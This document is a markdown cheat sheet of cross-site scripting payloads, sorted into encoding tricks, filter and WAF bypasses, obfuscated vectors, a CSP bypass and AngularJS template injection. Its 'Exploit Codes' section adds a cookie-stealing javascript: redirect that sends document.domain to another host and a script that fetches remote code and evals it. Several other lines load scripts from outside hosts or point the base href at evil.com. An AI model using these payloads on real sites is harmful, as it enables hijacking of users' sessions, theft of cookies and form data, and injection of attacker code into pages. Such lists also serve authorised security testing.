> Blind XSS

```https://xsshunter.com/```

---
> Encoding

```%u003Cscript%u003Eprompt%u0028303%u0029%u003C/script%u003E```

```%253Cscript%253Ealert(1)%253C%252Fscript%253E```

```%uff1cscript%uff1ealert(1);%uff1c/script%uff1e```

---
> XML Based XSS

```<![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>```

```<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</x:script>```

---
> Where :// is required after protocol

```javascript://%250aalert(1) ```

---
> XSS in email ID

```"\"><s>test"@gmail.com```

---
> alert, prompt, confirm is not allowed

```this[Object["keys"](this)[6]](1)```

```javascript:eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKTs='));```

```<script>eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKTs='));</script>```

```<svg/onload=t=/aler/.source+/t/.source;window.onerror=window[t];throw+1;//```

```[][`filter`][`constructor`](`ale`.concat(`rt\x28`.concat`0\x29`))();//```

```[]['\146\151\154\164\145\162']['\143\157\156\163\164\162\165\143\164\157\162']('\141\154\145\162\164\50\61\51')() ```

```([_,_____,_,_,__,___]=(__=[])+{___:__},[______,_,________,____,,_________,_______,__,,,__________]=[!!_____]+!_____+_____._____)[___+=_____+__________+__+______+_+________+___+______+_____+_][___](_________+_______+____+_+______+'(-~_____)')(__)```

```([,?,,,,??]=[]+{},[???,????,?????,??????,,???????,????????,?????????,,,??????????]=[!!?]+!?+?.?)[??+=?+??????????+?????????+???+????+?????+??+???+?+????][??](???????+????????+??????+????+???+'`1`')```

---
> Simple bypasses

```<body onpageshow=alert(1)>```

```<k onsubmit=alert(1)>```

```<k oninput=alert(1)>```

```<style onload=alert(1)>```

```<html ontouchstart=alert(1)>MobileXSS```

```<marquee behavior="alternate" onstart=alert(1)>XSS</marquee>```

```<script/x>alert(1)</script/x>```

```<details ontoggle=alert()>```

```<SCRIPT SRC=//BRUTELOGIC.COM.BR/1></SCRIPT>```

```<SVG ONLOAD=&#97&#108&#101&#114&#116(1)>```

```<noembed><img title="</noembed><img src onerror=alert(21)>"></noembed>```

```<a/href=//0>```

```<script src=//14.rs>```

```<base href=//evil.com>```

```" onfocus=alert(1) autofocus```

---
> Obfuscated vectors

```<imG/sRc=l oNerrOr=(prompt)() x>```

```<d3"<"/onclick="1>[confirm``]"<">XSS```

```<svg/x=">"/onload=confirm()//```

```<!'/*"/*/'/*/"/*--></Script><Image SrcSet=K */; OnError=confirm`1` //>```

```<svg </onload ="1> (_=prompt,_(1)) "">```

```<w="/x="y>"/ondblclick=`<`[confir\u006d``]>XXS```

```<A/iD=x hREf=jav&#x09;ascript:prom&#x09;pt(doc&#x09;ument.coo&#x09;kie); id=x>XSS```

```<sVg/onfake="x=y"oNload=;1^(co\u006efirm)``^1//```

---
> Exploit Codes

```Hidden Field data ~```

```<script>var xss = '';f=document.forms;for(i=0;i<f.length;i++){e=f[i].elements;for(n in e){if(e[n].type=='hidden'){alert(e[n].name+': '+e[n].value)}}};//'';</script>```

```Response on server ~```

```<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//127.0.0.1:8080");a.send();</script>```

```Cookie stealing with JS protocol ~```

```javascript:void(a='//127.0.0.1');void(b=document.domain);void(c=a.concat(b));void(window.location.assign(c));```

---
> Javascript XSS

```data:,alert(1)```

```\'-alert(1)//```

```'}alert(1);{'```

```'-alert()-'```

```'}alert(1)%0A{'```

```\'}alert(1);{//```

---
> CSP Bypassed

```<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1></script> <embed src='//ajax.googleapis.com/ajax/libs/yui/2.8.0r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e){alert(1)}//' allowscriptaccess=always>```

---
> Angular JS

```{{constructor.constructor('alert(1)')()}} ```

```<x ng-app>{{constructor.constructor('alert(1)')()}}```

---
> When Space and Slash doesnt work

```<svgonload=alert(1)>```

---
> Misc

```<script ~~~>confirm(1)</script ~~~>```

```window+=valueOf=alert(1)```

```[cookie].some(alert)```

```"accesskey=X onclick=alert(1)+```

```-alert(1)//\       (quoteless xss inside js context when param is reflecting 2 times in same line)```

```<svg onload=setInterval`alert\x28document.domain\x29`>```

```(alert)(1)```

```a=alert,a(1)	```

```[1].find(alert)```

```top["al"+"ert"](1)```

```top[/al/.source+/ert/.source](1)```

```al\u0065rt(1)```

```top['al\145rt'](1)```

```top[8680439..toString(30)](1)```

```<svg onload=alert&lpar;1&rpar;>```

```<svg onload=alert&#x28;1&#x29>```

```<svg onload=alert&#40;1&#41>```

```<svg onload=setInterval`alert\x28document.domain\x29`>```

```"><input type="submit" formaction="javascript&colon;this&lsqb;'a'&plus;'lert'&rsqb;`1`">```

```<body onfocus=alert(1)>```

```<object data=javascript:alert(1)>```

```<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">```

```<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>```

```<IFRAME SRC="javascript:alert('XSS');"></IFRAME>```

```%253cscript%253ealert(document.cookie)%253c/script%253e```

```<audio/onloadstart=alert(1) src>```

```%u0025%u0075%u0066%u0066%u0031%u0063%u0073%u0063%u0072%u0069%u0070%u0074%u0025%u0075%u0066%u0066%u0031%u0065%u0061%u006c%u0065%u0072%u0074%u0028%u0018%u0058%u0053%u0053%u0019%u0029%u003b%u0025%u0075%u0066%u0066%u0031%u0063%u002f%u0073%u0063%u0072%u0069%u0070%u0074%u0025%u0075%u0066%u0066%u0031%u0065```

```%uff1cscript%uff1ealert(1);%uff1c/script%uff1e```

```<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>                            akamai ghost wafbypass```

---
> Reference

```https://research.digitalinterruption.com/2018/12/18/a-deeper-look-into-xss-payloads/```
```https://portswigger.net/web-security/cross-site-scripting/cheat-sheet```
